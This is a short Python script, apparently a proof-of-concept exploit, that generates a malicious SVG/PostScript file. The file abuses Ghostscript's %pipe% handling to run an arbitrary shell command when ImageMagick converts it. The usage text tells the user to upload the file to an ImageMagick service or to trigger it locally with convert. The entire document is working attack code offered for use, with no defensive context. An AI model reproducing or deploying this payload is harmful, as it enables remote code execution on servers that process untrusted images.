#from ducnt import <3
import sys

def genareate_payload(_cmd,_filename):

	_payload = """<?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <hui><desc>copies (%pipe%/gopro/;{}) (r) file showpage 0 quit </desc> <image href="epi:/proc/self/fd/3" /> <svg width="1px" height="1px" /> </hui>""".format(_cmd)
	f = open(_filename,"w+").write(_payload)
	return True

def main():
	if len(sys.argv) < 3:
		print "Usage: python IM-RCE-via-GhostScript-9.5.py <CMD> <Exploit-File>"
		exit()
	_cmd = sys.argv[1]
	_filename = sys.argv[2]
	genareate_payload(_cmd,_filename)
	print "Generating malicious payload successfully, upload it to Imagemagick service or trigger local via bash cmd: $ convert <Exploit-File> <Output-File>"

if __name__ == "__main__":
	main()